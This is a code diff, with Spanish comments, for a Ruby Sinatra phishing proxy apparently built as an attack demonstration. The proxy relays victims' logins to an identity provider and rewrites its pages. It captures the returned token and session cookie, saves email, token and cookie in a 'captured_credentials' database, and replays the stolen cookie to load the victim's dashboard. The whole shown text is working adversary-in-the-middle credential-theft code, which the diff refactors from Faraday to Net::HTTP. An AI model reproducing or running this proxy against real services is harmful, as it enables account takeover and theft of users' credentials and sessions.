@@ -4,15 +4,13 @@
 
 require 'sinatra/base'
 require 'sinatra/contrib'
-require 'faraday'
 require 'sequel'
 require 'sqlite3'
 require 'dotenv/load'
 require 'uri'
 require 'net/http'
 
-# DB propia del proxy — separada del IdP
-# En el ataque real el atacante tiene su propio servidor
+# DB propia del proxy
 PROXY_DB = Sequel.connect("sqlite://#{__dir__}/../captured_credentials.db")
 
 PROXY_DB.create_table?(:captured_credentials) do
@@ -48,9 +46,10 @@ class AvatarProxy < Sinatra::Base
   end
 
   get "/login" do
-    idp_response = Faraday.get("#{IDP_URL}/login")
+    uri = URI("#{IDP_URL}/login")
+    response = Net::HTTP.get_response(uri)
     content_type 'text/html'
-    rewrite_html(idp_response.body)
+    rewrite_html(response.body)
   end
 
   post "/login" do
@@ -59,39 +58,37 @@ class AvatarProxy < Sinatra::Base
 
     puts "Proxy: Received login attempt for #{email}"
 
-    # Hacemos el POST directamente con Net::HTTP para no seguir redirects
+    # Net::HTTP no sigue redirects automáticamente
+    # perfecto para capturar el 302 con el token y la cookie
     uri = URI("#{IDP_URL}/login")
     req = Net::HTTP::Post.new(uri)
     req['Content-Type'] = 'application/x-www-form-urlencoded'
-    # Reenviar headers del navegador para que la petición al IdP sea lo más similar posible
-    req['User-Agent'] = request.user_agent if request.user_agent
-    req['Accept'] = request.env['HTTP_ACCEPT'] if request.env['HTTP_ACCEPT']
-    req['Accept-Language'] = request.env['HTTP_ACCEPT_LANGUAGE'] if request.env['HTTP_ACCEPT_LANGUAGE']
-    req['Origin'] = request.env['HTTP_ORIGIN'] if request.env['HTTP_ORIGIN']
-    req['Referer'] = request.env['HTTP_REFERER'] if request.env['HTTP_REFERER']
-    req['Connection'] = request.env['HTTP_CONNECTION'] if request.env['HTTP_CONNECTION']
+    req['User-Agent']       = request.user_agent if request.user_agent
+    req['Accept']           = request.env['HTTP_ACCEPT'] if request.env['HTTP_ACCEPT']
+    req['Accept-Language']  = request.env['HTTP_ACCEPT_LANGUAGE'] if request.env['HTTP_ACCEPT_LANGUAGE']
 
     req.body = URI.encode_www_form({
       email:    email,
       password: password
     })
 
-    http = Net::HTTP.new(uri.host, uri.port)
-    http.use_ssl = (uri.scheme == 'https')
-    idp_response = http.request(req)
+    http          = Net::HTTP.new(uri.host, uri.port)
+    http.use_ssl  = (uri.scheme == 'https')
+    idp_response  = http.request(req)
 
-    # Log de depuración: mostrar headers entrantes y respuesta del IdP
-    puts "[proxy] Incoming request headers: #{request.env.select { |k,_| k.start_with?('HTTP_') }}"
+    puts "Proxy: IdP response status: #{idp_response.code}"
+    puts "Proxy: IdP response headers: #{idp_response.to_hash}"
 
-    if idp_response.code.to_i == 302
+    if idp_response.code == "302"
       location       = idp_response['location']
-      token          = location.to_s.match(/token=(.+)/)[1] rescue nil
+      token          = location.match(/token=(.+)/)[1] rescue nil
       raw_cookie     = idp_response['set-cookie']
-      session_cookie = raw_cookie.to_s.split(';').first rescue nil
-      puts "[proxy] IdP response headers: #{idp_response.to_hash.inspect}"
+      session_cookie = raw_cookie.split(';').first rescue nil
+
+      puts "Proxy: Token captured: #{token}"
+      puts "Proxy: Cookie captured: #{session_cookie}"
 
       if token && session_cookie
-        # Guarda en la DB propia del proxy
         PROXY_DB[:captured_credentials].insert(
           email:          email,
           token:          token,
@@ -105,30 +102,29 @@ class AvatarProxy < Sinatra::Base
         session[:token]      = token
         session[:idp_cookie] = session_cookie
 
-        puts "Proxy: Redirecting to /dashboard"
         redirect "/dashboard"
       else
-        puts "Proxy: Token or session_cookie missing, showing login again"
+        puts "Proxy: Token or cookie not found"
         content_type 'text/html'
-        rewrite_html(Faraday.get("#{IDP_URL}/login").body)
+        rewrite_html(Net::HTTP.get(URI("#{IDP_URL}/login")))
       end
     else
       puts "Proxy: IDP did not return 302, showing login again"
       content_type 'text/html'
-      rewrite_html(Faraday.get("#{IDP_URL}/login").body)
+      rewrite_html(Net::HTTP.get(URI("#{IDP_URL}/login")))
     end
   end
 
   get "/dashboard" do
-    puts "Proxy: Accessing /dashboard, session[:user]: #{session[:user]}"
     halt 401, "Not authorized" unless session[:user]
 
-    puts "Proxy: Fetching dashboard from IDP with cookie: #{session[:idp_cookie]}"
-    idp_response = Faraday.get("#{IDP_URL}/dashboard") do |req|
-      req.headers['Cookie'] = session[:idp_cookie]
-    end
+    uri = URI("#{IDP_URL}/dashboard")
+    req = Net::HTTP::Get.new(uri)
+    req['Cookie'] = session[:idp_cookie]
 
-    puts "Proxy: IDP dashboard response status: #{idp_response.status}"
+    http         = Net::HTTP.new(uri.host, uri.port)
+    idp_response = http.request(req)
+
     content_type 'text/html'
     rewrite_html(idp_response.body)
   end
